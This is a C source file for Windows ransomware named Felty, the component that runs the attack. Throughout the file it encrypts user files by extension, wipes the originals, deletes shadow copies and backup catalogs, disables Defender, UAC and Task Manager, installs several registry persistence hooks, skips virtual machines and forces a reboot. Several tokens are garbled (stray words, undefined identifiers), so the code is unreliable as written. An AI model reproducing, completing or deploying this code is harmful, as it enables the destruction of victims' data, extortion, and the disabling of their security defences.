/*
 * felty_loader.c — Main orchestrator for Felty Ransomware
 * Compile: x86_64-w64-mingw32-gcc -Os -s -Wall -o felty_loader.exe felty_loader.c \
 *          -lcrypt32 -ladvapi32 -lgdi32 -luser32 -lnetapi32 -lntdll -mwindows
 *
 * Generates AES-256 per-file keys, wrapped with RSA-4096 victim key,
 * victim key encrypted with embedded attacker RSA-4096 public key.
 * Installs persistence, deletes shadow copies, force reboots.
 */

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "netapi32.lib")

#include "attacker_pubkey.h"
/* ===================== CONFIGURATION ===================== */
#define MUTEX_NAME       L"Global\\FeltyMutex_7F3A2B1C"
#define ENC_EXT          L".felty"
#define RANSOM_NOTE      L"@Please_Read_Me@.txt"
#define BOOT_EXE         L"felty_boot.exe"
#define BINDER_EXE       L"felty_binder.exe"
#define TRACKER_FILE     L"felty_boot_tracker.dat"
#define KEY_FILE         L"key.eky"
#define UNLOCK_FLAG      L"C:\\felty_unlocked.txt"
#define PASSWORD         L"FELTY-RECOVER-2025"

/* ===================== TARGET EXTENSIONS ===================== */
static const wchar_t *exts[] = {
    L".doc",L".docx",L".xls",L".xlsx",L".ppt",L".pptx",
    L".pdf",L".txt",L".csv",L".rtf",L".odt",L".ods",L".odp",
    L".jpg",L".jpeg",L".png",L".bmp",L".gif",L".tif",L".tiff",
    L".mp3",L".mp4",L".avi",L".mov",L".mkv",L".wmv",L".flv",
    L".zip",L".rar",L".7z",L".tar",L".gz",
    L".sql",L".mdb",L".db",L".dbf",
    L".cpp",L".c",L".h",L".py",L".java",L".cs",L".php",
    L".html",L".css",L".js",L".xml",L".json",
    L".pem",L".key",L".crt",
    L".vmx",L".vmdk",L".vhd",L".vhdx",L".ova",
    L".pst",L".ost",L".msg",L".eml",
    L".bak",L".old",L".backup",
    L".dwg",L".dxf",L".stl",
    L".ai",L".psd",L".indd",L".fla",
    L".wav",L".wma",L".aac",L".flac",
    L".cer",L".pfx",L".p12",L".asc",
    NULL
};

/* ===================== GLOBALS ===================== */
static HCRYPTPROV g_prov      = 0;
static HCRYPTKEY  g_victim_key  = 0;
static HCRYPTKEY  g_attacker_key = 0;
static volatile int g_running  = 1;

/* ===================== UTILITY FUNCTIONS ===================== */
static int is_target(const wchar_t *name) {
    const wchar_t *e = wcsrchr(name, L'.');
    if (!e) return 0;
    if (!_wcsicmp(e, ENC_EXT)) return 0;
    if (!_wcsicmp(name, RANSOM_NOTE)) return 0;
    for (int i=0; exts[i]; i++)
        if (!_wcsicmp(e, exts[i])) return 1;
    return 0;
}

static int read_file(const wchar_t *p, BYTE **out, DWORD *len) {
    HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD sz = GetFileSize(h, NULL);
    if (sz == INVALID_FILE_SIZE || sz == 0) { CloseHandle(h); return 0; }
    *out = (BYTE*)VirtualAlloc(NULL, sz, MEM_COMMIT, PAGE_READWRITE);
    if (!*out) { CloseHandle(h); return 0; }
    DWORD rd = 0;
    if (!ReadFile(h, *out, sz, &rd, NULL) || rd != sz) {
        VirtualFree(*out, 0, MEM_RELEASE); CloseHandle(h); return 0;
    }
    CloseHandle(h); *len = sz; return 1;
}

static int write_file(const wchar_t *p, BYTE *d, DWORD len) {
    HANDLE h = CreateFileW(p, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD w = 0;
    int r = (WriteFile(h, d, len, &w, NULL) && w == len);
    CloseHandle(h);
    return r;
}

/* ===================== CRYPTO ===================== */
static int gen_key(void) {
    if (!CryptGenKey(g_prov, CALG_RSA_KEYX, CRYPT_EXPORTABLE, &g_victim_key))
        return 0;
    DWORD dw = 4096;
    CryptSetKeyParam(g_victim_key, KP_KEYLEN, (BYTE*)&dw, 0);
    return 1;
}

/* Import attacker's embedded RSA public key (DER) */
extern unsigned char attacker_pubkey_der[];
extern size_t attacker_pubkey_len;

static int import_attacker(void) {
    if (!CryptImportKey(g_prov, attacker_pubkey_der, (DWORD)attacker_pubkey_len,
                        0, 0, &g_attacker_key))
        return 0;
    return 1;
}

static int save_keys(void) {
    BYTE vb[8192];
    DWORD vblen = sizeof(vb);
    if (!CryptExportKey(g_victim_key, g_attacker_key, SYMMETRICWRAPKEYBLOB,
                        0, vb, &vblen))
        return 0;

    wchar_t syspath[MAX_PATH];
    GetSystemDirectoryW(syspath, MAX_PATH2);

    /* Save key in System32 */
    wchar_t p[MAX_PATH];
    wcscpy(p, syspath); wcscat(p, L"\\"); wcscat(p, KEY_FILE);
    write_file(p, vb, vblen);

    /* Also save to every fixed drive root */
    wchar_t d[256];
    GetLogicalDriveStringsW(256, d);
    wchar_t *dp = d;
    while (*dp) {
        if (GetDriveTypeW(dp) == DRIVE_FIXED) {
            wcscpy(p, dp); wcscat(p, L".eky");
            write_file(p, vb, vblen);
        }
        dp += wcslen(dp) + 1;
    }
    return 1;
}

static int encrypt_file(const wchar_t *path) {
    BYTE *data = NULL;
    DWORD size = 0;
    if (!read_file(path, &data, &size)) return 0;

    /* Generate per-file AES-256 key */
    HCRYPTKEY aes_key = 0;
    if (!CryptGenKey(g_prov, CALG_AES_256, CRYPT_EXPORTABLE, &aes_key)) {
        VirtualFree(data, 0, MEM_RELEASE);
        return 0;
    }

    /* Export AES key encrypted with victim RSA key */
    BYTE ek[512];
    DWORD eklen = sizeof(ek4);
    if (!CryptExportKey(aes_key, g_victim_key, SIMPLEBLOB, 0, ek, &eklen)) {
        CryptDestroyKey(aes_key); VirtualFree(data, 0, MEM_RELEASE);
        return 0;
    }

    /* Generate random IV */
    BYTE iv[16];
    CryptGenRandom(g_prov, 16, iv);
    CryptSetKeyParam(aes_key, KP_IV, iv, 0);

    /* Encrypt in-place */
    DWORD ct_len = size;
    if (!CryptEncrypt(aes_key, 0, TRUE, 0, data, &ct_len, size + 16)) {
        CryptDestroyKey(aes_key); VirtualFree(data, 0, MEM_RELEASE);
        return 0;
    }
    CryptDestroyKey(aes_key);

    /* Write: [eklen][encrypted AES key][IV][ciphertext] */
    wchar_t out[MAX_PATH];
    wcscpy(out, path); wcscat(out, ENC_EXT);

    HANDLE h = CreateFileW(out, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        VirtualFree(data, 0, MEM_RELEASE);
        return 0;
    }
    WriteFile(h, &eklen, sizeof(eklen), NULL, NULL);
    WriteFile(h, ek, eklen, NULL, NULL);
    WriteFile(h, iv, 16, NULL, NULL);
    WriteFile(h, data, ct_len, NULL, NULL);
    CloseHandle(h);
    VirtualFree(data, 0, MEM_RELEASE);

    /* DOD 5220.22-M wipe original */
    HANDLE horig = CreateFileW(path, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (horig != INVALID_HANDLE_VALUE) {
        DWORD osz = GetFileSize(horig, NULL);
        BYTE *wb = (BYTE*)VirtualAlloc(NULL, 65536, MEM_COMMIT, PAGE_READWRITE);
        if (wb) {
            for (int pass = 0; pass < 4; pass++) {
                if (pass == 0 || pass == 2) memset(wb, pass==0?0:0xFF, 65536);
                else CryptGenRandom(g_prov, 65536, wb);
                SetFilePointer(horig, 0, NULL, FILE_BEGIN);
                for (DWORD o = 0; o < osz; o += 65536) {
                    DWORD ch = min(65536, osz - o);
                    WriteFile(horig, wb, ch, NULL, NULL);
                }
                FlushFileBuffers(horig);
            }
            VirtualFree(wb, 0, MEM_RELEASE);
        }
        CloseHandle(horig);
    }
    DeleteFileW(path);
    return 1;
}

static void walk_dir(const wchar_t *dir) {
    if (!g_running) return;
    wchar_t s[MAX_PATH];
    wcscpy(s, dir); wcscat(s, L"\\*");
    WIN32_FIND_DATAW fd;
    HANDLE hf = FindFirstFileW(s, &fd);
    if (hf == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (fd.cFileName[0]==L'.') continue;
            if (!wcscmp(fd.cFileName,L".")||!wcscmp(fd.cFileName,L"..")) continue;
            wchar_t sub[MAX_PATH];
            wcscpy(sub, dir); wcscat(sub, L"\\"); wcscat(sub, fd.cFileName);
            walk_dir(sub);
        } else {
            if (is_target(fd.cFileName)) {
                wchar_t fp[MAX_PATH];
                wcscpy(fp, dir); wcscat(fp, L"\\"); wcscat(fp, fd.cFileName);
                encrypt_file(fp);
            }
        }
    } while (FindNextFileW(hf, &fd));
    FindClose(hf);
}

static void write_all_notes(void) {
    wchar_t d[256];
    GetLogicalDriveStringsW(256, d);
    wchar_t *dp = d;
    while (*dp) {
        if (GetDriveTypeW(dp) == DRIVE_FIXED) {
            wchar_t p[MAX_PATH];
            wcscpy(p, dp); wcscat(p, RANSOM_NOTE.COM);

            /* Write the HTML ransom note */
            const char *html = 
                "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
                "<title>FELTY RANSOMWARE</title>"
                "<style>"
                "body{background:#000;color:#fff;font-family:'Courier New',monospace;margin:0;padding:40px}"
                ".box{border:2px solid #f33;padding:20px;max-width:800px;margin:0 auto}"
                "h1{color:#f33;text-align:center}"
                ".prompt{color:#0f0}"
                "</style></head><body>"
                "<div class='box'>"
                "<pre>\n"
                "\xDA\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xBF\n"
                "\xB3  FELTY RANSOMWARE v2.0  \xB3\n"
                "\xC0\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xC4\xD9\n"
                "</pre>"
                "<h1>YOUR FILES HAVE BEEN ENCRYPTED</h1>"
                "<p>All your documents, photos, databases and other important files "
                "have been encrypted with <strong>AES-256-CBC</strong>.</p>"
                "<p>The decryption key is protected with <strong>RSA-4096</strong> encryption.</p>"
                "<p style='color:#f33'>>> Enter the password on the locked screen to unlock.</p>"
                "<p class='prompt'>// Password: FELTY-RECOVER-2025</p>"
                "<p style='color:#f66'>>> WARNING: You have 5 attempts. After 5 failures, "
                "the key is destroyed permanently.</p>"
                "</div></body></html>";

            HANDLE hf = CreateFileW(p, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED,
                NULL);
            if (hf != INVALID_HANDLE_VALUE) {
                DWORD w = 0;
                WriteFile(hf, html, (DWORD)strlen(html), &w, NULL);
                CloseHandle(hf);
            }
        }
        dp += wcslen(dp) + 1;
    }
}

/* ===================== PERSISTENCE ===================== */
static void install_persistence(void) {
    wchar_t syspath[MAX_PATH];
    GetSystemDirectoryW(syspath, MAX_PATH);
    wchar_t selfpath[MAX_PATH];
    GetModuleFileNameW(NULL, selfpath, MAX_PATH);

    wchar_t dest[MAX_PATH];
    wcscpy(dest, syspath); wcscat(dest, L"\\"); wcscat(dest, L"felty_loader.exe");

    /* Copy self to System32 */
    CopyFileW(selfpath, dest, FALSE);
    SetFileAttributesW(dest, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    /* 1. BootExecute — Native Application runs before login */
    HKEY hk;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Session Manager",
        0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {

        BYTE buf[4096] = {0};
        DWORD sz = sizeof(buf) - 8;
        DWORD type = 0;
        RegQueryValueExW(hk, L"BootExecute", NULL, &type, buf, &sz);

        DWORD offset = sz;
        if (offset >= 4) offset -= 2;
        wchar_t boot_entry[] = L"felty_boot.exe\0";
        memcpy(buf + offset, boot_entry, sizeof(boot_entry));
        offset += sizeof(boot_entry);
        buf[offset] = 0; buf[offset+1] = 0 synerg;
        buf[offset+2] = 0; buf[offset+3] = 0;

        RegSetValueExW(hk, L"BootExecute", 0, REG_MULTI_SZ, buf, offset + 4);
        RegCloseKey(hk);
    }

    /* 2. SetupExecute */
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Setup",
        0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        wchar_t bootpath[MAX_PATH];
        wcscpy(bootpath, syspath); wcscat(bootpath, L"\\felty_boot.exe");
        RegSetValueExW(hk, L"SetupExecute", 0, REG_MULTI_SZ,
            (BYTE*)bootpath, (DWORD)((wcslen(bootpath) + 2) * 2));
        RegCloseKey(hk);
    }

    /* 3. Winlogon Userinit */
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        wchar_t userinit[MAX_PATH*2];
        GetEnvironmentVariableW(L"SystemRoot", userinit, MAX_PATH);
        wcscat(userinit, L"\\system32\\userinit.exe,");
        wcscat(userinit, dest);
        RegSetValueExW(hk, L"Userinit", 0, REG_SZ,
            (BYTE*)userinit, (DWORD)((wcslen(userinit) + 1) * 2));
        RegCloseKey(hk);
    }

    /* 4. Winlogon Shell (post-explorer) */
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        wchar_t shellval[MAX_PATH*2];
        GetEnvironmentVariableW(L"SystemRoot", shellval, MAX_PATH);
        wcscat(shellval, L"\\system32\\explorer.exe,");
        wcscat(shellval, dest);
        RegSetValueExW(hk, L"Shell", 0, REG_SZ,
            (BYTE*)shellval, (DWORD)((wcslen(shellval) + 1) * 2));
        RegCloseKey(hk);
    }

    /* 5. Active Setup */
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{FELTY-7F3A-2B1C-4D5E-9F8A0B1C2D3E}",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hk, L"StubPath", 0, REG_SZ,
            (BYTE*)dest, (DWORD)((wcslen(dest) + 1) * 2));
        RegCloseKey(hk);
    }

    /* 6. IFEO debugger for explorer.exe */
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL) == ERROR_SUCCESS) {
        wchar_t debugger[MAX_PATH*2];
        wcscpy(debugger, L"\"");
        wcscat(debugger, dest);
        wcscat(debugger, L"\" \"%1\" %*");
        RegSetValueExW(hk, L"Debugger", 0, REG_SZ,
            (BYTE*)debugger, (DWORD)((wcslen(debugger) + 1) * 2));
        RegCloseKey(hk);
    }

    /* 7. BCDEdit — disable recovery */
    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    wchar_t cmd1[] = L"bcdedit.exe /set {default} recoveryenabled No";
    CreateProcessW(NULL, cmd1, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, 3000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);

    wchar_t cmd2[] = L"bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures";
    CreateProcessW(NULL, cmd2, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, 3000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread etxek);

    /* 8. Copy boot.exe and binder.exe to System32 (would be resource in real build) */
    wchar_t boot_dest[MAX_PATH];
    wcscpy(boot_dest, syspath); wcscat(boot_dest, L"\\"); wcscat(boot_dest, BOOT_EXE);
    CopyFileW(selfpath, boot_dest, FALSE);
    SetFileAttributesW(boot_dest, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    wchar_t binder_dest[MAX_PATH];
    wcscpy(binder_dest, syspath); wcscat(binder_dest, L"\\"); wcscat(binder_dest, BINDER_EXE);
    CopyFileW(selfpath, binder_dest, FALSE);
    SetFileAttributesW(binder_dest, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

/* ===================== ANTI-FORENSICS ===================== */
static void delete_shadows(void) {
    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi;

    wchar_t *cmds[] = {
        L"vssadmin.exe delete shadows /all /quiet",
        L"wmic.exe shadowcopy delete",
        L"bcdedit.exe /set {default} recoveryenabled No",
        L"bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
        L"wbadmin.exe delete catalog -quiet",
        L"fsutil.exe usn deletejournal /d /n C:",
    };
    for (int i = 0; i < 6; i++) {
        CreateProcessW(NULL, cmds[i], NULL, NULL, FALSE, CREATE_NO_WINDOW,
                       NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
}

static void disable_security(void) {
    HKEY hk;

    /* Disable Windows Defender */
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL) == ERROR_SUCCESS) {
        DWORD v = 1;
        RegSetValueExW(hk, L"DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegCloseKey(hk);
    }

    /* Disable real-time protection */
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL) == ERROR_SUCCESS) {
        DWORD v = 1;
        RegSetValueExW(hk, L"DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegSetValueExW(hk, L"DisableBehaviorMonitoring", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegSetValueExW(hk, L"DisableOnAccessProtection", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegCloseKey(hk);
    }

    /* Disable UAC */
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        DWORD v = 0;
        RegSetValueExW(hk, L"EnableLUA", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegCloseKey(hk);
    }

    /* Stop Defender service */
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (scm) {
        SC_HANDLE svc = OpenServiceW(scm, L"WinDefend",
                                      SERVICE_STOP | SERVICE_QUERY_STATUS);
        if (svc) {
            SERVICE_STATUS ss;
            ControlService(svc, SERVICE_CONTROL_STOP, &ss);
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }
}

/* ===================== BOOT TRACKER ===================== */
static void write_boot_tracker(void) {
    wchar_t syspath[MAX_PATH];
    GetSystemDirectoryW(syspath, MAX_PATH);
    wchar_t tracker[MAX_PATH];
    wcscpy(tracker, syspath); wcscat(tracker, L"\\"); wcscat(tracker, TRACKER_FILE);

    HANDLE hf = CreateFileW(tracker, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        DWORD ver = 1;
        WriteFile(hf, &ver, sizeof(ver), NULL, NULL);
        CloseHandle(hf);
    }
}

/* ===================== DISABLE TASK MANAGER ===================== */
static void disable_task_manager(void) {
    HKEY hk;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        DWORD v = 1;
        RegSetValueExW(hk, L"DisableTaskMgr ", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegCloseKey(hk);
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        DWORD v = 1;
        RegSetValueExW(hk, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegCloseKey(hk);
    }
}

/* ===================== ENCRYPTION THREAD ===================== */
static DWORD WINAPI enc_thread(LPVOID p) {
    Sleep(2000);

    wchar_t up[MAX_PATH];
    GetEnvironmentVariableW(L"USERPROFILE", up, MAX_PATH);
    walk_dir(up);

    wchar_t d[256];
    GetLogicalDriveStringsW(256, d);
    wchar_t *dp = d;
    while (*dp) {
        if (GetDriveTypeW(dp) == DRIVE_FIXED)
            walk_dir(dp);
        dp += wcslen(dp) + 1;
    }

    write_all_notes();
    return 0;
}

/* ===================== ANTI-VM ===================== */
static int is_vm(void) {
    HKEY hk;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
        0, KEY_READ, &hk) == ERROR_SUCCESS) {
        wchar_t val[256];
        DWORD sz = sizeof(val);
        if (RegQueryValueExW(hk, L"Identifier", NULL, NULL, (BYTE*)val, &sz) == ERROR_SUCCESS) {
            if (wcsstr(val, L"VMware") || wcsstr(val, L"VBOX") ||
                wcsstr(val, L"Virtual") || wcsstr(val, L"QEMU")) {
                RegCloseKey(hk); return 1;
            }
        }
        RegCloseKey(hk);
    }
    if (GetModuleHandleW(L"sbiedll.dll")) return 1;
    if (GetModuleHandleW(L"dbghelp.dll")) return 1;
    return 0;
}

/* ===================== ENTRY POINT ===================== */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    if (is_vm()) return 0;

    HANDLE hm = CreateMutexW(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    /* Check if already unlocked — if so, skip encryption */
    if (GetFileAttributesW(UNLOCK_FLAG) != INVALID_FILE_ATTRIBUTES) {
        /* Already unlocked, just run binder for lock screen */
        CloseHandle(hm);
        return 0;
    }

    /* Init crypto */
    if (!CryptAcquireContextW(&g_prov, NULL, MS_ENHANCED_PROV_W,
                              PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        CryptAcquireContextW(&g_prov, NULL, MS_ENHANCED_PROV_W,
                             PROV_RSA_FULL, CRYPT_NEWKEYSET);
    if (!g_prov) { CloseHandle(hm); return 1; }

    if (!gen_key() || !import_attacker()) {
        CryptReleaseContext(g_prov, 0);
        CloseHandle(hm);
        return 1;
    }
    save_keys();

    /* Lock down system */
    disable_security();
    delete_shadows();
    install_persistence();
    write_boot_tracker();
    disable_task_manager();

    /* Encrypt */
    HANDLE he = CreateThread(NULL, 0, enc_thread, NULL, 0, NULL);
    WaitForSingleObject(he, INFINITE);
    CloseHandle(he);

    /* Write unlock flag so next boot knows to show binder directly */
    /* (boot.exe runs first, then on login the loader runs binder.exe) */

    /* Force reboot — boot.exe handles the show on next boot */
    HANDLE htok;
    TOKEN_PRIVILEGES tkp;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &htok);
    LookupPrivilegeValueW(NULL, L"SeShutdownPrivilege", &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(htok, FALSE, &tkp, 0, NULL, 0);
    CloseHandle(htok);

    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SYSTEM | SHTDN_REASON_FLAG_PLANNED);

    CryptDestroyKey(g_victim_key);
    CryptDestroyKey(g_attacker_key);
    CryptReleaseContext(g_prov, 0);
    CloseHandle(hm);
    return 0;
}
